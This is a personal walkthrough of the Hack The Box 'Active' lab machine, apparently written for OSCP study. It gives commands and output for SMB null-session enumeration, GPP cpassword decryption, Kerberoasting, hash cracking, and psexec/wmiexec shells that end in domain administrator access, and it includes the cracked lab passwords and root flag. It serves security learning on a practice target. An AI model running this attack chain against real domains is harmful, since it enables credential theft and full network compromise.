
https://app.hackthebox.com/machines/Active
widely considered the quintessential starter box for learning Active Directory

```
nmap -sCV -v -p- -T4 10.129.13.84 -oA nmap/active
...
Discovered open port 139/tcp on 10.129.13.84
Discovered open port 53/tcp on 10.129.13.84
Discovered open port 445/tcp on 10.129.13.84
Discovered open port 135/tcp on 10.129.13.84
Discovered open port 47001/tcp on 10.129.13.84
Discovered open port 49158/tcp on 10.129.13.84
Discovered open port 49157/tcp on 10.129.13.84
Discovered open port 49177/tcp on 10.129.13.84
Discovered open port 49155/tcp on 10.129.13.84
Discovered open port 49169/tcp on 10.129.13.84
Discovered open port 464/tcp on 10.129.13.84
Discovered open port 88/tcp on 10.129.13.84
Discovered open port 593/tcp on 10.129.13.84
Discovered open port 3269/tcp on 10.129.13.84
Discovered open port 3268/tcp on 10.129.13.84
Discovered open port 49153/tcp on 10.129.13.84
Discovered open port 5722/tcp on 10.129.13.84
Discovered open port 9389/tcp on 10.129.13.84
Discovered open port 49171/tcp on 10.129.13.84
Discovered open port 636/tcp on 10.129.13.84
Discovered open port 389/tcp on 10.129.13.84
Discovered open port 49152/tcp on 10.129.13.84
Discovered open port 49154/tcp on 10.129.13.84
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-28 02:32:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49177/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-03-28T02:33:24
|_  start_date: 2026-03-28T02:28:56
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

```



```
nxc ldap -u '' -p '' -d active.htb 10.129.13.84 --users                                                        
LDAP        10.129.13.84    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)
LDAP        10.129.13.84    389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1
LDAP        10.129.13.84    389    DC               [+] active.htb\: 
LDAP        10.129.13.84    389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1

```

Output tells us two very important things for your OSCP methodology: 
-what information is "public" on this Domain Controller and, more importantly, 
-what is strictly locked down.

### 1. Successful Fingerprinting (The Metadata)

Even without credentials, **NetExec (nxc)** successfully performed an unauthenticated "bind" to gather basic system info:

- **Target OS:** Windows Server 2008 R2 (Build 7601).
    
- **Hostname:** `DC`
    
- **Domain Name:** `active.htb`
    

**Why this matters:** Since it’s an older OS (Server 2008 R2), it is likely vulnerable to older exploits or misconfigurations that might not exist on a modern Server 2022 box.

---

### 2. Failed User Enumeration (The Error)

The main part of command (`--users`) failed. 
The error `In order to perform this operation a successful bind must be completed` means:

- **No Null Sessions:** This Domain Controller does **not** allow anonymous (null) users to query the LDAP database for a list of users.
    
- **Authentication Required:** You cannot "dump" the user list until you have at least one set of valid credentials (even low-privilege ones).
    

---

### Recommended Next Steps

Since LDAP is locked down for anonymous users, weneed to pivot to other protocols that might be "leakier" on a Windows 2008 R2 box.

1. **Check SMB for Null Sessions:** Often, if LDAP is closed, SMB might still have guest access or null sessions enabled. Try: `nxc smb 10.129.13.84 -u '' -p '' --shares`

2. **Check for GPP (Group Policy Preferences):** On older boxes like this, check if there are any `Groups.xml` files in the `SYSVOL` or `NETLOGON` shares. These often contain encrypted passwords that use a static, public AES key.

3. **DNS Enumeration:** See if we can perform a zone transfer or just enumerate subdomains to find other potential targets in the `active.htb` domain. (not relevant to exams)


----

nxc smb 10.129.13.84 -u '' -p '' -M spider_plus

To search for that GPP file (or any sensitive file) using a null session, use the **`spider_plus`** module. This will list all files and save a JSON digest of the share contents to your machine.

Bash

```
nxc smb 10.129.13.84 -u '' -p '' -M spider_plus
```

- **`-M spider_plus`**: This module "spiders" the shares and creates a text/JSON file in `~/.nxc/modules/SpiderPlus/` containing every file path it found.
    
- Once it finishes, you can simply `grep` that output file for "Groups.xml".


---

![[nxc-Mspider-output.png]]

----

Manual (and often faster) Way

smbclient -L //10.129.13.84 -N

smbclient //10.129.13.84/Replication -N

Once inside the `smb: \>` prompt, run:

recurse ON
prompt OFF
ls Groups.xml

-----
in this case, the manual way is not working

```
smbclient -L//10.129.13.84 -N       
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.13.84 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


┌──(lanc3㉿kali)-[~]
└─$ smbclient //10.129.13.84/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> ls Groups.xml
NT_STATUS_NO_SUCH_FILE listing \Groups.xml
smb: \> mask ""
smb: \> ls *Groups.xml
NT_STATUS_NO_SUCH_FILE listing \*Groups.xml
smb: \> 

```

------

grep -i "Groups.xml" /home/lanc3/.nxc/modules/nxc_spider_plus/10.129.13.84.json
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {



```
smb: \> get "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml"
Error opening local file active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
smb: \> 
smb: \> get "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" groups.xml

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as groups.xml (8.5 KiloBytes/sec) (average 8.5 KiloBytes/sec)
smb: \> 

```


find . -name "groups.xml"


cat groups.xml | grep -i "cpassword"

```

<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

userName="active.htb\SVC_TGS"

cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

## GPPstillStandingStrong2k18


----

In Active Directory, Service Accounts are the primary targets for a technique called **Kerberoasting**

------

```
nxc ldap 10.129.13.84 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb --users    
LDAP        10.129.13.84    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)
LDAP        10.129.13.84    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.129.13.84    389    DC               [*] Enumerated 4 domain users: active.htb
LDAP        10.129.13.84    389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                     
LDAP        10.129.13.84    389    DC               Administrator                 2018-07-19 03:06:40 0        Built-in account for administering the computer/domain                                                                                                                             
LDAP        10.129.13.84    389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain                                                                                                                           
LDAP        10.129.13.84    389    DC               krbtgt                        2018-07-19 02:50:36 0        Key Distribution Center Service Account                                                                                                                                            
LDAP        10.129.13.84    389    DC               SVC_TGS                       2018-07-19 04:14:38 0       

```

above only useful for 
knowing we have **successfully authenticated** to LDAP. Before, you were getting an "Operations Error," but now you have a "Success" bind (`[+] active.htb\SVC_TGS`).

output reveals for your next steps:

### 1. The Low User Count

There are only **4 domain users**. This is a huge hint in a lab environment.

- **Administrator:** Your ultimate goal.
    
- **Guest/krbtgt:** Usually dead ends for initial exploitation.
    
- **SVC_TGS:** The account you currently "own."
    

### 2. Password Age (Stale Accounts)

Notice the **Last PW Set** date: **2018-07-19**. These passwords haven't been changed in nearly 8 years. In the OSCP world, this almost guarantees that if you find a hash, it will be crackable because it likely follows an old, weak password policy from that era.

### 3. The "SVC" Naming Convention

The username `SVC_TGS` is a massive "Check me!" sign.

- **SVC** = Service Account.
    
- **TGS** = Ticket Granting Service.
    

This naming is a deliberate hint for **Kerberoasting**. In Active Directory, service accounts often have **Service Principal Names (SPNs)** associated with them. Since you now have valid credentials for one domain user (`SVC_TGS`), you have the right to ask the Domain Controller for the service tickets of _any_ other account that has an SPN.

------

```
nxc ldap 10.129.13.84 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb --kerberoasting output.txt
LDAP        10.129.13.84    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)
LDAP        10.129.13.84    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.129.13.84    389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.13.84    389    DC               [*] Total of records returned 1
[-] Some other OSError occured: [Errno Connection error (ACTIVE.HTB:88)] [Errno -2] Name or service not known
LDAP        10.129.13.84    389    DC               [-] Error retrieving TGT for SVC_TGS\active.htb from None

```

error `[Errno -2] Name or service not known` tells us that your Kali machine is trying to talk to the Kerberos service on `ACTIVE.HTB:88`, but it doesn't know what IP address `ACTIVE.HTB` belongs to.

Unlike SMB or LDAP (where you provided the IP), Kerberos tickets are strictly tied to the **Domain Name**. When your tool tries to request a ticket, it looks for the domain name in your local configuration.

### The Fix: Update your `/etc/hosts`

You need to tell your Kali machine that `active.htb` is at `10.129.13.84`.

1. Open your hosts file with sudo:
    
    Bash
    
    ```
    sudo nano /etc/hosts
    ```
    
2. Add this line at the bottom:
    
    Plaintext
    
    ```
    10.129.13.84  active.htb dc.active.htb
    ```
    
3. Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`).
    

---

### Why this matters for the Exam

You should always map the IP to the domain name as soon as you identify it. Many tools (like `GetUserSPNs.py`, `BloodHound`, and `Evil-WinRM`) will fail or behave strangely if they can't resolve the hostname.

------
nxc ldap 10.129.13.84 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb --kerberoasting output.txt

![[keberoasting.png]]

```
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.13.84 -request

```

![[impacket-GetUserSPNs.png]]

---
 cracking krb5tg
 
 first using john,
 then hashcat
 
 ![[john-active.png]]

![[hashcat-active.png]]

after cracking this password
Ticketmaster1968

next step is **Remote Code Execution (RCE)** to grab the final flags

-----

## nxc smb 10.129.13.84 -u 'Administrator' -p 'Ticketmaster1968'

```
nxc smb 10.129.13.84 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.129.13.84    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                                                                                                              
SMB         10.129.13.84    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)

```

-----

**Impacket's psexec (The "Classic" way)** This creates a service on the target to give SYSTEM shell

psexec.py active.htb/Administrator:Ticketmaster1968@10.129.13.84

![[impacket-psexec.png]]

**Impacket's wmiexec (The "Stealthier" way)** 
Often more reliable in lab environments as it doesn't leave as many artifacts as psexec

wmiexec.py active.htb/Administrator:Ticketmaster1968@10.129.13.84

![[impacket-wmiexec.png]]
--------

C:\Users\Administrator\Desktop> type root.txt
ef8dc321eb7b9a016ca655ea50c7d45a
